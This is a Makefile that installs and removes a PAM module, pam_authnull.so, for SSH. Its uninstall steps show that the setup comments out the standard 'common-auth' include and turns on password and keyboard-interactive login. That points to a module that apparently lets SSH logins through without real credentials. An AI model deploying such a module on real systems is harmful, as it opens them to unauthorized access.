# Makefile for installing and uninstalling the PAM module

PAM_MODULE=pam_authnull.so
PAM_PATH=/lib/x86_64-linux-gnu/security/$(PAM_MODULE)
SSHD_CONFIG=/etc/ssh/sshd_config
PAM_FILE=/etc/pam.d/sshd


# Installation: Configure and restart services
install: copy restart_services
	@echo "Installation completed successfully."


uninstall: remove_pam restore_sshd restart_services
	@echo "Uninstallation completed successfully."

copy:
	@echo "Copying $(PAM_MODULE) to $(PAM_PATH)..."
	@sudo cp $(PAM_MODULE) $(PAM_PATH)
	@if [ $$? -ne 0 ]; then echo "Failed to copy $(PAM_MODULE)." && exit 1; fi

restart_services:
	@echo "Restarting SSH services..."
	@sudo systemctl restart sshd 2>/dev/null || true
	@sudo systemctl restart ssh 2>/dev/null || true

remove_pam:
	@echo "Removing PAM configuration from $(PAM_FILE)..."
	@sudo sed -i "/pam_authnull.so/d" $(PAM_FILE)
	@sudo sed -i 's/^#@include common-auth/@include common-auth/' $(PAM_FILE)
	@echo "Removing PAM module..."
	@sudo rm -f $(PAM_PATH)

restore_sshd:
	@echo "Restoring $(SSHD_CONFIG)..."
	@sudo sed -i 's/^KbdInteractiveAuthentication yes/KbdInteractiveAuthentication no/' $(SSHD_CONFIG)
	@sudo sed -i 's/^PasswordAuthentication yes/PasswordAuthentication no/' $(SSHD_CONFIG)
	@sudo sed -i '/AuthenticationMethods keyboard-interactive/d' $(SSHD_CONFIG)

.PHONY: install uninstall download copy configure restart_services remove_pam restore_sshd
